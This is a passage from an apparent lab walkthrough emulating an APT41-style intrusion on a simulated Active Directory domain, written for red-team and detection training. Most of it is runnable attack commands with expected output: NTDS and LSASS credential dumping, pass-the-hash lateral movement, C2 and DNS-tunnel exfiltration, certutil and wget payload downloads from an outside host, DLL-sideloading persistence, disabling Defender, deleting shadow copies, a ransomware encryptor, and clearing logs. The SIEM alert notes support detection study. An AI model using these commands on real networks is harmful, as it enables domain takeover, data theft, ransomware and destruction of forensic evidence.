Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::
jsmith:1104:aad3b435b51404eeaad3b435b51404ee:<JSMITH_NTLM>:::
svc_ldap:1105:aad3b435b51404eeaad3b435b51404ee:<SVCLDAP_NTLM>:::
svc_backup:1106:aad3b435b51404eeaad3b435b51404ee:<SVCBACKUP_NTLM>:::
DC01$:1001:...
FS01$:1107:...
WS01$:1108:...
```

> **Alternative — crackmapexec `--ntds`:** CME wraps secretsdump internally. Both methods produce
> identical output. Use CME if you prefer a unified toolchain: `crackmapexec smb 192.168.10.10 -u svc_backup -p 'Backup_Svc99!' --ntds`

```bash
[KALI]
# Extract Administrator NTLM (field 4, colon-delimited)
ADMIN_NTLM=$(grep "^Administrator:" /opt/loot/ntds_dump.txt | cut -d: -f4)
echo "Administrator NTLM: ${ADMIN_NTLM}"

# Save for Pass-the-Hash in Phase 5
echo "${ADMIN_NTLM}" > /opt/loot/admin_ntlm.txt
```

**What we have now:** Every domain account's NT hash. With the `krbtgt` hash we can forge Golden
Tickets valid for any service in the domain — persistent access that survives password resets for
all other accounts (only invalidated by double-rotating krbtgt).

**SIEM alert fired:**
- VSS creation events on DC01 — **HIGH**

### 4.3 LSASS Dump on WS01 (Credential Demonstration)

**Why this step:** Even though we already have domain hashes via NTDS dump, LSASS dumping is a
separate documented APT41 technique worth demonstrating. LSASS holds credentials for interactive
and service logons on the current machine — useful for extracting Kerberos tickets and any plaintext
credentials if WDigest is re-enabled. Run this after Phase 5.1 (you need a shell on WS01 first).

> Run this after you have a SYSTEM shell on WS01 from Phase 5.1 (`impacket-smbexec`).

```bash
[WS01 — smbexec SYSTEM session]
# C:\Temp is pre-created by Ansible provisioning
dir C:\Temp\

# Windows Defender on Windows 10 22H2 blocks comsvcs.dll MiniDump with "Access is denied"
# even from SYSTEM. Tamper Protection blocks ALL in-OS disable methods: Set-MpPreference,
# registry writes via WinRM (even from SYSTEM), and safe-mode WinRM (NTLM stack not loaded).
# The lab disables Defender OFFLINE during 'make up' by editing the WS01 VMDK SOFTWARE hive
# directly via qemu-nbd+hivexregedit — Tamper Protection cannot enforce when the OS is off.
# Verify before the dump:
powershell -ep bypass -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"
# Expected: False — if True, run 'make reset && make up' on the host to re-apply the fix.

# Dump LSASS using comsvcs.dll MiniDump via PowerShell one-liner.
# Must be a single command: smbexec runs each line in a separate cmd.exe process,
# so environment variables (set LPID=...) and for /f loops don't persist between commands.
# PowerShell resolves the PID and triggers MiniDump in one shot.
# -ep bypass: skip execution policy check   Start-Sleep 3: MiniDump writes asynchronously
powershell -ep bypass -c "$id=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $id C:\Temp\lsass.dmp full; Start-Sleep 3"

# Confirm dump created (should be 30-80 MB)
dir C:\Temp\lsass.dmp
```

**Expected:**
```
 Volume in drive C has no label.
 Volume Serial Number is XXXX-YYYY

 Directory of C:\Temp

04/24/2026  02:15 AM        42,394,624 lsass.dmp
```

```bash
[KALI]
# Download the dump from WS01 via smbclient (impacket-smbclient `get` saves to CWD)
cd /opt/loot
impacket-smbclient novatech.local/jsmith:'Research#2024'@192.168.10.50
# In the smbclient prompt:
#   use C$
#   cd Temp
#   get lsass.dmp
# File lands at /opt/loot/lsass.dmp
```

```bash
[KALI]
# Parse with pypykatz — pure-Python Mimikatz-compatible LSASS parser
# lsa: Local Security Authority   minidump: parse from memory dump file
pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A 6 "== MSV =="
```

**Expected:**
```
== MSV ==
Username: jsmith
Domain: NOVATECH
LM: None
NT: <jsmith_ntlm>   ← NTLM hash for jsmith
SHA1: <sha1>
```

> **Note:** WDigest credential caching is disabled by default on Windows 10 / Server 2016+.
> Expect NTLM hashes only — no cleartext passwords unless WDigest was explicitly re-enabled.
> `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1` enables it.

**SIEM alert fired:**
- Sysmon EID 10 (ProcessAccess): `rundll32.exe → lsass.exe` — **CRITICAL**

---

## Phase 5: Lateral Movement

**ATT&CK:** T1021.002, T1047, T1550.002

### 5.1 WEB01 → WS01 via jsmith

**Why jsmith (not svc_backup):** Ansible provisions `NOVATECH\jsmith` as a member of WS01's local
`Administrators` group. svc_backup holds Backup Operators rights on the domain but is NOT added as
local admin on WS01. CrackMapExec confirms this distinction before we waste time on psexec.

```bash
[KALI]
# Verify jsmith has local admin on WS01 — look for (Pwn3d!)
# -u jsmith: domain account   -p password   (no --local-auth: domain auth)
crackmapexec smb 192.168.10.50 \
  -u jsmith \
  -p 'Research#2024'
```

**Expected:**
```
SMB  192.168.10.50  445  WS01  [*] Windows 10 Build 19041 (name:WS01) (domain:novatech.local) (signing:False) (SMBv1:False)
SMB  192.168.10.50  445  WS01  [+] novatech.local\jsmith:Research#2024 (Pwn3d!)
```

`(Pwn3d!)` = CrackMapExec confirmed remote execution rights (local admin). Without it you get
`[+]` (auth succeeded) but no shell.

```bash
[KALI]
# Get SYSTEM shell on WS01 via Impacket SmbExec
# SmbExec: creates a Windows service that runs each command via a batch file written to a
# temp SMB share. No named pipe back-channel (unlike PsExec) — more reliable in virtualised
# environments where TCP connections through the bridge can be unstable.
impacket-smbexec novatech.local/jsmith:'Research#2024'@192.168.10.50
```

**Expected:**
```
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WS01
```

> **PsExec vs SmbExec in this lab:** `impacket-psexec` uploads a service binary and connects
> back via a named pipe on a *new* TCP connection. In virtualised bridge stacks the second
> connection sometimes hangs even when the first (SMB negotiate) succeeds. `impacket-smbexec`
> avoids this by tunnelling I/O through the same SMB share rather than a separate pipe.
> For the article narrative both represent T1021.002 (SMB/Windows Admin Shares).

> **Now go run Phase 4.3** (LSASS dump) while you have the WS01 shell.

**SIEM alerts fired:**
- Windows EID 4624 (LogonType 3): NTLM network logon from `192.168.10.5` (Kali on target_net) — **HIGH**
- Windows EID 4697: Service installed (SmbExec randomized service name) — **HIGH**
- Sysmon EID 1: Service binary execution — **HIGH**

### 5.2 WS01 → DC01 via Pass-the-Hash

**What is Pass-the-Hash:** Windows NTLM authentication doesn't need the plaintext password —
it only needs the NT hash. By passing the hash directly to the authentication challenge, we
authenticate as Administrator without ever cracking the password. We got the Administrator NTLM
hash from the NTDS dump in Phase 4.2.

```bash
[KALI]
ADMIN_NTLM=$(cat /opt/loot/admin_ntlm.txt)

# Confirm Administrator DOMAIN hash is valid across the subnet
# -H: use NTLM hash instead of password   format: LM_hash:NT_hash
# The LM hash (aad3b435...) is a dummy — Windows hasn't used LM since Vista
# NOTE: do NOT use --local-auth — this is the DOMAIN Administrator hash, not a local account
crackmapexec smb 192.168.10.0/24 \
  -u administrator \
  -H "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  -x "whoami"
```

**Expected — hash works on DC01, FS01, and WS01:**
```
SMB  192.168.10.10  445  DC01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
SMB  192.168.10.20  445  FS01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
SMB  192.168.10.50  445  WS01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
```

```bash
[KALI]
# Get SYSTEM shell on DC01 via SmbExec (PtH)
# NOTE: impacket-psexec hangs in this lab — it uploads a service binary then connects back via
# a named pipe on a new TCP connection; that second connection hangs through the VirtualBox bridge.
# impacket-smbexec avoids this by tunnelling I/O through the same SMB connection.
impacket-smbexec \
  -hashes "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  novatech.local/administrator@192.168.10.10
```

**Expected:**
```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01
```

> **If smbexec fails on DC01** with `STATUS_OBJECT_NAME_NOT_FOUND` — DC security policy is blocking
> remote service creation via SCM. The NTDS dump (Phase 4.2) and direct FS01 collection (Phase 6)
> work without a DC01 shell. Use `impacket-secretsdump` and `impacket-smbclient` from Kali directly.

### 5.3 WMI for Quiet Remote Execution

**Why WMI instead of PsExec:** Impacket PsExec creates a Windows service (visible in EID 4697, SCM
logs). WMI remote execution uses the existing Windows Management Instrumentation infrastructure —
no service is created, no binary is uploaded. Still noisy on the wire (DCOM traffic) but generates
fewer host artifacts.

> **Lab note:** `impacket-wmiexec` uses DCOM (port 135 + dynamic high ports). In this lab the
> VirtualBox bridge stack causes the dynamic port back-channel to hang — the same underlying issue
> as psexec. wmiexec is documented here for ATT&CK technique coverage (T1047). Use `impacket-smbexec`
> for actual execution in the lab.

```bash
[KALI]
# Run commands remotely via WMI — quieter than psexec (fewer host artifacts)
# Use plaintext password (known from NTDS) or -hashes for PtH
impacket-wmiexec \
  novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
  "whoami"
# If this hangs — Ctrl+C and use impacket-smbexec instead (see §5.1)
```

---

## Phase 6: Collection

**ATT&CK:** T1005, T1074.001, T1560.001, T1105

**What's happening:** FS01 holds the crown jewels (clinical trial data, manufacturing docs).
With Domain Admin credentials we access FS01 directly from Kali via SMB — no DC01 shell required.

```bash
[KALI]
# List FS01 shares — confirms Research and Manufacturing are exposed
impacket-smbclient novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.20
```

**In the smbclient prompt:**
```
# shares
ADMIN$
C$
IPC$
Manufacturing
Research

# use Research
# tree .
# mget *

# use Manufacturing
# tree .
# mget *
```

> `mget *` downloads all files from the current directory to CWD on Kali.
> Launch smbclient from `/opt/loot/` so files land there automatically.

**Expected on FS01 (provisioned by Ansible):**
```
Research\clinical_data_record_1.csv  ... (30 records)
Research\NDA_filing_2026.pdf
Manufacturing\synthesis_process_1.docx  ... (15 docs)
```

```bash
[KALI]
# Compress collected data for exfiltration
cd /opt/loot
zip -r -P "RxPhage2024!" data.zip Research/ Manufacturing/ ntds_dump.txt lsass.dmp
ls -lh data.zip
```

> **If DC01 shell is available (via smbexec):** The Windows-side staging path uses `net use` +
> `robocopy` + `certutil`-downloaded 7-Zip — documented APT41 LOLBAS technique (T1105):
> ```
> [DC01]
> net use Z: \\192.168.10.20\Research      /user:NOVATECH\Administrator NovaTech_Admin2024!
> net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!
> robocopy Z:\ C:\Temp\archive\Research      /E /NFL /NDL /NC /NJS /NJH
> robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH
> certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
> C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
> ```

```
dir C:\Temp\data.zip
```

**Expected:** `C:\Temp\data.zip` — ~2-5 MB (dummy data, much smaller than real clinical data)

---

## Phase 7: Exfiltration

**ATT&CK:** T1041, T1048.001

### 7.1 Primary: HTTPS via Sliver C2 (DC01 session)

**What's happening:** Data is staged on DC01. We need a Sliver session on DC01 to download it.
First, we deploy RxPhage on DC01 to get a C2 session there, then exfiltrate via the beacon.

**Deploy RxPhage Windows loader on DC01:**
```bash
[DC01]
# Download the Windows PE loader from Kali staging
# rxphage_loader.dll runs as a standalone PE if renamed to rxphage.exe
certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage/rxphage.exe C:\Temp\rxphage.exe

# Start it (connects back to Sliver C2 at 10.0.0.10:443)
start /b C:\Temp\rxphage.exe
```

```bash
[C2] — Sliver console
sliver > sessions
# Should now show a DC01 session
# ID  Name   Transport  RemoteAddress         Hostname  Username           OS/Arch
# 1   WEB01  https      192.168.10.100:xxxxx  web01     root               linux/amd64
# 2   DC01   https      192.168.10.10:xxxxx   DC01      NT AUTHORITY\SYSTEM windows/amd64

sliver > use 2       # use the DC01 session

# Switch beacon to interactive mode — removes the 60-second check-in delay
# Without this, a 2.31 GB file transfer would be chunked through 60-second intervals
# (each chunk must wait for the next beacon cycle — would take hours at normal rate)
sliver (DC01) > sleep 0
# [*] Beacon sleep set to 0s (interactive mode)
```

```bash
[C2]
# Download the archive from DC01 to /opt/loot/ on Kali
sliver (DC01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip
# [*] Downloading C:\Temp\data.zip (2.31 GB)...
# [*] Wrote 2.31 GB to /opt/loot/dc01_data.zip

# Restore periodic beacon immediately after transfer completes
# sleep 0 means continuous HTTPS polling — far too noisy for long-term ops
sliver (DC01) > sleep 60
# [*] Beacon sleep set to 60s (normal ops mode)
```

```bash
[KALI]
# Verify the archive is intact and decrypt a sample
ls -lh /opt/loot/dc01_data.zip
7za l -p"RxPhage2024!" /opt/loot/dc01_data.zip | head -20
```

**Detection note:** Zeek `conn.log` shows long-duration HTTPS sessions to `10.0.0.10:443` during
`sleep 0` — sustained byte counts distinguish this from the normal 60-second beacon rhythm.
The Windows SRUM database (`C:\Windows\System32\sru\SRUDB.dat`) independently records bytes sent
by `rxphage.exe` — a forensic artifact that survives even if network captures are unavailable.

### 7.2 Backup Channel: DNS Tunneling (dnscat2)

**Why DNS tunneling:** DNS port 53 is rarely blocked outbound (DNS must work for the machine to
function). An HTTPS C2 channel might get blocked by proxy or firewall — a DNS tunnel provides
a backup that works through most filtering. dnscat2 encodes data in DNS query subdomains.

**Note on APT41 attribution:** APT41 is assessed to use custom DNS C2 implementations. dnscat2 is a
publicly available tool — it serves as a functional analogue for the lab but carries LOW attribution
value for APT41 specifically.

```bash
[KALI]
# dnscat2 server — listens for DNS queries on UDP 53
# --dns domain: the tunnel domain (clients query *.tunnel.attacker-infra.com)
# --no-cache: disable caching for accuracy in lab testing
# --secret: HMAC symmetric encryption key → prevents eavesdroppers from injecting commands
# Without --secret the sub-technique would be T1048.003 (unencrypted); with it: T1048.001
# dnscat2 Kali package installs server to /usr/share/dnscat2/server/dnscat2.rb
ruby /usr/share/dnscat2/server/dnscat2.rb \
  --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
  --no-cache \
  --secret="DragonRx2024"
```

```bash
[WEB01 — via webshell or Sliver shell — deploy dnscat2 client]
wget -q http://10.0.0.5:8900/dnscat -O /tmp/.cache/dnscat
chmod +x /tmp/.cache/dnscat

# --secret must match the server secret
nohup /tmp/.cache/dnscat \
  --secret="DragonRx2024" \
  tunnel.attacker-infra.com \
  &>/dev/null &
echo "dnscat2 PID: $!"
```

**Back in dnscat2 server — session appears:**
```
New window created: 1
New window created: 1
(the new window can be interacted with)
dnscat2> windows
0 :: main [active]
  crypto-debug :: Security
  1 :: command (web01) [encrypted, NOT verified]
dnscat2> window -i 1
command (web01) 1> shell
command (web01) 1> New window created: 2
Shell session created!
command (web01) 1> window -i 2
```

**SIEM alert fired:**
- Zeek DNS: high-entropy subdomain labels > 40 characters, entropy > 3.5 bits/char — **MEDIUM**

---

## Phase 8: DLL Sideloading Persistence on DC01

**ATT&CK:** T1574.002, T1053.005, T1070.006

**What's happening:** The DLL sideloading technique abuses Windows DLL search order. When a binary
searches for a DLL, Windows looks in the application directory first — before `System32`. By placing
a malicious DLL with the right name next to a legitimate, signed binary, we hijack the load. This is
one of APT41's most extensively documented persistence patterns (PlugX deployment methodology).

**Our setup:** Oracle `java.exe` (signed by Oracle) loads `jvm.dll` from its directory. We copy
`java.exe` to an attacker-controlled directory and place our malicious `jvm.dll` alongside it. A
scheduled task runs `java.exe` at boot → loads our DLL → executes our payload.

```bash
[DC01 — cmd.exe SYSTEM session]
# Create the persistence directory
# C:\ProgramData\Oracle\Java\javapath is a real path used by Oracle Java installers
# Using it makes the directory blend with legitimate software
mkdir "C:\ProgramData\Oracle\Java\javapath"

# Download a legitimate java.exe from Kali staging to act as the sideload host binary
# (DC01 has no Java installed — we stage our own copy)
# This binary is signed by Oracle, making the scheduled task look legitimate in process listings
certutil.exe -urlcache -f http://10.0.0.5:8900/java.exe \
  "C:\ProgramData\Oracle\Java\javapath\java.exe"

# Verify the binary is valid (it should have an Oracle code-signing certificate)
powershell -command ^
  "(Get-AuthenticodeSignature 'C:\ProgramData\Oracle\Java\javapath\java.exe').Status"
# Expected: Valid
```

```bash
[C2] — Sliver console
sliver > use 2   # DC01 session

# Upload the malicious jvm.dll (RxPhage Windows DLL loader)
# When java.exe runs, Windows finds jvm.dll in the same directory (before System32)
# and loads it — executing our payload as SYSTEM via the scheduled task
sliver (DC01) > upload /opt/tools/rxphage/rxphage_loader.dll \
                       "C:\ProgramData\Oracle\Java\javapath\jvm.dll"
# [*] Wrote 524288 bytes to C:\ProgramData\Oracle\Java\javapath\jvm.dll
```

```bash
[DC01]
# Create scheduled task for boot persistence
# /tn: task name (JavaUpdateService mimics legitimate Java maintenance tasks)
# /tr: full path to the executable
# /sc ONSTART: run at every system startup
# /ru SYSTEM: run as SYSTEM account (highest privilege)
# /f: force creation (overwrite if exists)
schtasks /create ^
  /tn "JavaUpdateService" ^
  /tr "\"C:\ProgramData\Oracle\Java\javapath\java.exe\"" ^
  /sc ONSTART ^
  /ru SYSTEM ^
  /f

# Verify the task was created
schtasks /query /tn "JavaUpdateService" /fo LIST
```

**Expected:**
```
Folder: \
HostName:                             DC01
TaskName:                             \JavaUpdateService
Status:                               Ready
Run As User:                          SYSTEM
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
```

```bash
[DC01]
# TIMESTOMPING: modify the DLL's LastWriteTime to obscure when it was installed
# The attacker sets the timestamp to 2023 to make it look like pre-existing software
# Uses PowerShell's .LastWriteTime property on the FileInfo object
powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"

# Verify the LastWriteTime was changed (this is $STANDARD_INFORMATION in NTFS MFT)
powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime"
# 01/15/2023 09:00:00

# Check directory listing shows the fake timestamp
dir /tw "C:\ProgramData\Oracle\Java\javapath\"
```

> **Forensic countermeasure:** Timestomping only modifies `$STANDARD_INFORMATION` in the NTFS MFT.
> The `$FILE_NAME` attribute is written by the NTFS kernel during file creation — the attacker
> cannot modify it with standard tools. A forensic examiner comparing both attributes will see:
> - `$STANDARD_INFORMATION.Created`: 2023-01-15 09:00:00 (tampered)
> - `$FILE_NAME.Created`: 2026-04-24 02:00:15 (real)
> The discrepancy is an immediate forensic red flag.

**SIEM alert fired:**
- Sysmon EID 7 (ImageLoad): unsigned `jvm.dll` loaded by `java.exe` from `C:\ProgramData` — **HIGH**

---

## Phase 9 (Optional): Ransomware Phase

**ATT&CK:** T1562.001, T1490, T1486

**Context:** APT41 is assessed — not confirmed — to follow espionage operations with criminal
monetization in specific campaigns. This phase is optional. The encryptor only targets
`C:\Temp\RansomTest\` — it is safe to run.

```bash
[DC01 — as SYSTEM]
# Step 1: Impair defenses — T1562.001
# Disable Windows Defender via registry (GPO path — persists across reboots)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
# Disable real-time monitoring via PowerShell cmdlet (immediate effect)
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Confirm Defender is disabled
powershell -command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"
# DisableRealtimeMonitoring : True

# Step 2: Inhibit System Recovery — T1490
# Delete all Volume Shadow Copies (VSS snapshots) — prevents file recovery
vssadmin delete shadows /all /quiet
# Stop Windows Backup services
net stop "wbengine" /y   2>nul   & rem Windows Backup Engine
net stop "SDRSVC"   /y   2>nul   & rem System Data Recovery Service
net stop "swprv"    /y   2>nul   & rem MS Software Shadow Copy Provider

# Verify no shadow copies remain
vssadmin list shadows
# No items found that satisfy the query.

# Step 3: Encryption — T1486 (SAFE: targets C:\Temp\RansomTest\ ONLY)
mkdir C:\Temp\RansomTest
echo "NovaTech Phase III Trial — Patient Cohort Alpha CONFIDENTIAL" > C:\Temp\RansomTest\research.txt
echo "Proprietary Synthesis Formula v2.3 — RESTRICTED"             > C:\Temp\RansomTest\formula.xlsx

# Stage and run the encryptor
certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
C:\Temp\rxphage_encrypt.exe --path C:\Temp\RansomTest\

# View ransom note deployed by encryptor
type C:\Temp\RansomTest\DRAGONRX_RANSOM.txt
```

**ATT&CK mapping note:**
- `vssadmin delete shadows` → T1490 (Inhibit System Recovery) — deletes recovery mechanisms, not data
- `rxphage_encrypt.exe` → T1486 (Data Encrypted for Impact) — encrypts files for extortion
- Disabling Defender → T1562.001 (Impair Defenses)

**SIEM alert fired:**
- Sysmon EID 1: `vssadmin.exe` with `delete` argument — **HIGH**
- Windows EID 4688: same process creation event — **HIGH**

---

## Phase 10: Cleanup / Anti-Forensics

**ATT&CK:** T1070.004, T1070.001, T1070.006

**What's happening:** APT41 is documented to use anti-forensic techniques to extend dwell time and
complicate attribution. In practice, sophisticated actors often retain persistence (webshell, DLL
sideload) while cleaning initial exploitation artifacts.

```bash
[WEB01 — Linux cleanup]
# Clear bash command history
# history -c: clear in-memory history
# history -w: write (empty) history to file
# unset HISTFILE: prevent session from writing a new history file on exit
history -c && history -w
cat /dev/null > ~/.bash_history
unset HISTFILE

# Remove the Log4Shell evidence from the Tomcat access log
# The ${jndi:} string in access.log is the primary forensic artifact for initial access
# APT41 has been documented removing web server logs
# NOTE: this is very noisy — the log file disappearing is itself a detection signal
# Real APT41 often edits specific lines rather than deleting the whole log
cat /var/log/tomcat*/access_log* 2>/dev/null | grep -v "jndi" > /tmp/clean_log && \
  mv /tmp/clean_log /var/log/tomcat*/access_log* 2>/dev/null

# Remove dnscat2 if decommissioning the DNS tunnel
# kill $(pgrep dnscat)
# rm -f /tmp/.cache/dnscat

# Leave webshell and RxPhage in place — APT41 retains persistence after initial access cleanup
```

```bash
[DC01 — Windows cleanup]
# Clear Windows event logs — T1070.001
# Security log: contains all our authentication events (EID 4624, 4662, 4769, etc.)
# System log: contains service creation (PsExec), VSS events
# Application log: application-specific events
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Verify logs cleared
wevtutil gli Security | findstr "NumberOfLogRecords"
# NumberOfLogRecords: 0

# Clear PowerShell command history (stored per-user)
powershell -command ^
  "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History"

# Remove staging artifacts (but KEEP persistence — DLL sideload + scheduled task stay)
del /f /q C:\Temp\lsass.dmp       2>nul
del /f /q C:\Temp\data.zip        2>nul
del /f /q C:\Temp\7za.exe         2>nul
del /f /q C:\Temp\rxphage.exe     2>nul
del /f /q C:\Temp\rxphage_encrypt.exe 2>nul
del /f /q C:\Temp\SharpHound.exe  2>nul

rmdir /s /q C:\Temp\archive       2>nul
rmdir /s /q C:\Temp\bh_output     2>nul
rmdir /s /q C:\Temp\RansomTest    2>nul
```

> **Forensic reality:** Clearing Windows event logs is itself a high-fidelity detection signal
> (Windows EID 1102 — audit log cleared, EID 104 — system log cleared). Wazuh and any properly
> configured SIEM will alert on log clearing. Sophisticated actors clear logs rarely and surgically
> to avoid this signal. For this lab, it demonstrates the capability.

---

## Kill Chain Summary

```
INITIAL ACCESS
  Log4Shell (CVE-2021-44228) via X-Api-Version header → root@web01

FOOTHOLD (two independent channels)
  ├── JSP webshell: /resources/imgs/cache.jsp
  └── RxPhage beacon: /tmp/.cache/rxphage → Sliver C2 (10.0.0.10:443)

DISCOVERY
  /proc/1/environ → LDAP_USER=svc_ldap / LDAP_PASS=NovaTech2021!
  ldapsearch → svc_backup (SPN, Backup Operators), jsmith (R&D, local admin WS01)

CREDENTIAL ACCESS
  Kerberoast svc_backup                     → Backup_Svc99! (AES256 ticket; john --format=krb5-18)
  impacket-secretsdump DRSUAPI (DC01)       → ALL domain NTLM hashes incl. Administrator + krbtgt
  LSASS dump on WS01 (optional demo)        → jsmith NTLM (download via impacket-smbclient)

LATERAL MOVEMENT
  jsmith:Research#2024 → WS01 (SmbExec SYSTEM — smbexec avoids named-pipe back-channel)
  Administrator NTLM   → DC01 (PtH via secretsdump DRSUAPI; shell via smbexec if DC policy allows)

COLLECTION
  impacket-smbclient (from Kali) → FS01\Research, FS01\Manufacturing (mget *)
  zip -P → encrypted archive /opt/loot/data.zip
  (alt: net use + robocopy + certutil/7za from DC01 shell)

EXFILTRATION
  Sliver download (sleep 0) → /opt/loot/dc01_data.zip
  dnscat2 DNS tunnel         → backup channel (T1048.001)

PERSISTENCE on DC01
  DLL sideloading: java.exe + jvm.dll (rxphage_loader)
  Scheduled task: JavaUpdateService (ONSTART, SYSTEM)
  Timestomping: LastWriteTime = 2023-01-15

OPTIONAL IMPACT
  vssadmin delete shadows → T1490
  rxphage_encrypt.exe     → T1486 (safe test path only)

DWELL TIME: 4 days, 17 hours, 37 minutes
12 SIEM alerts generated — none reviewed until Day 6
```

---

## Loot Summary

```
/opt/loot/
├── recon/
│   ├── web01_scan.nmap             nmap results — version + default scripts
│   └── whatweb.txt                 web technology fingerprint
├── kerberoast_hashes.txt           TGS hash: svc_backup  ($krb5tgs$23$)
├── kerberoast_cracked.txt          svc_backup:Backup_Svc99!
├── ntds_dump.ntds                  All domain NTLM hashes (Administrator, krbtgt, ...)
├── admin_ntlm.txt                  Administrator NTLM (extracted for PtH)
├── lsass.dmp                       LSASS memory dump from WS01
├── dc01_data.zip                   Crown jewels: Research + Manufacturing + SYSVOL
└── bh_output/
    └── <timestamp>_BloodHound.zip  BloodHound AD attack path graph
```

---

*Next: [Detection Guide](detection-guide.md) — every alert the SIEM generates during this attack, what it looks like in Kibana, and how to write detection rules for each phase.*
